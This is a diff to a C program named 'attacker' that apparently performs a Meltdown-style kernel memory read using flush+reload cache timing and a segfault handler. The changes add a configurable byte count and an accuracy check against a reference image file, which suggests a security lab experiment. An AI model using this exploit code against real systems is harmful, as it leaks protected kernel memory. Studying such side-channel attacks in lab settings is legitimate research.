@@ -17,7 +17,8 @@
 #define CACHE_HIT_THRESHOLD 100
 #define DELTA 1024 // to reduce bias toward 0
 #define ITER_N 1000
-#define READ_N 16 // number of kernel bytes to read
+
+static char* pic_bytes = NULL; // just to verify accuracy
 
 // using the same technique from cache-time.c/flush-reload.c
 uint8_t probe_array[PROBE_N * PAGE_SIZE];
@@ -49,15 +50,46 @@ void probe() {
 	}
 }
 
+int read_bytes(char* file) {
+	
+	FILE* fd = fopen(file, "rb"); // open the image file
+	if(!fd) {
+		perror("Failed to load picture.\n");
+		return -1;
+	}
+	printf("%s loaded.\n", file);
+
+	// get file bytes_n
+	fseek(fd, 0, SEEK_END); // goes to the end of file
+	long bytes_n = ftell(fd); // read the position in the file
+
+	pic_bytes = (char*) malloc(bytes_n); // allocate a buffer for image bytes
+	printf("Loaded image file (%lu bytes ; %lu KB)\n", bytes_n, bytes_n/1024); 
+
+	rewind(fd); // move to beginning of file
+	fread(pic_bytes, 1, bytes_n, fd); // read file contents
+	fclose(fd); // close image file
+
+	return bytes_n;
+
+}
+
 int main(int argc, char* argv[]) {
 
-	if(argc != 2) {
-		printf("./attacker <address>\n");
+	if(argc != 3 && argc != 4) {
+		printf("./attacker <address> <num bytes to read> <correct img file>\n");
 		return 1;	
 	}
 	
 	unsigned long addr = strtoul(argv[1], NULL, 16);
-	printf("Got address %p\n", addr);
+	int read_n = atoi(argv[2]);
+	char* file = NULL;
+	if(argv[3]) {
+		file = argv[3]; // just to measure accuracy
+		read_bytes(file);
+	}
+
+	printf("Reading %i bytes from address %p\n", read_n, addr);
 
 	// register signal handler for seg fault
 	signal(SIGSEGV, catch_segv);
@@ -71,10 +103,10 @@ int main(int argc, char* argv[]) {
 
 	/* Same technique as cache-time.c/flush-reload.c */
 
-	printf("%-12s %-12s %-12s %-12s\n", "Byte #", "Guess (b)", "Hits", "Total Iterations");
+//	printf("%-12s %-12s %-12s %-12s\n", "Byte #", "Guess (b)", "Hits", "Total Iterations");
 
-	int c, i, iter;
-	for(c=0; c<READ_N; c++) { // for each char in secret
+	int c, i, iter, correct=0;
+	for(c=0; c<read_n; c++) { // for each char in secret
 		memset(scores, 0, PROBE_N * sizeof(int)); // reset scores
 
 		for(iter=0; iter<ITER_N; iter++) {
@@ -91,7 +123,7 @@ int main(int argc, char* argv[]) {
 			}		
 			
 			// bring victim data into the cache
-			int ret = pread(fd, NULL, 0, 0); // triggers the proc_read() function in kernel to be executed
+			int ret = pread(fd, NULL, 1, c); // triggers the proc_read() function in kernel to be executed
 
 			// creates a checkpoint ; context is saved in sigjump_buf jbuf
 			if(sigsetjmp(jbuf, 1) == 0) {  // return 0 if checkpoint was set up ; returns non-zero if returning from siglongjump()
@@ -113,15 +145,27 @@ int main(int argc, char* argv[]) {
 			}
 			probe(); 
 		} // iter ; end
-		int max = 0;
+		unsigned char max = 0;
 		for(i=0; i<PROBE_N; i++) {
 			if(scores[i] > max) max = i;
 		}
-		printf("%-12i %-12x %-12i %-12i\n", c, max, scores[max], ITER_N);
-
+		//printf("%-12i %-12x %-12i %-12i\n", c, max, scores[max], ITER_N);
+		if(file) {
+			if(c != 0 && c % 16 == 0) printf("\n");
+			if(max != pic_bytes[c]) printf("__ ");
+			else {
+				printf("%02x ", max);
+				correct++;
+			}
+		} else {
+			if(c != 0 && c % 16 == 0) printf("\n");
+			printf("%02x ", max);
+		}
 		//printf("Guess: %c (%i) ; %i hits out of %i iterations)\n", max, max, scores[max], ITER_N);
 		addr++; // move to next char
 	} // c ; end
-
+	printf("\n");
+	if(file) printf("%i correct out of %i (%.2f%% accuracy)\n", correct, read_n, (float)correct/read_n * 100);
+	
 	return 0;
 }
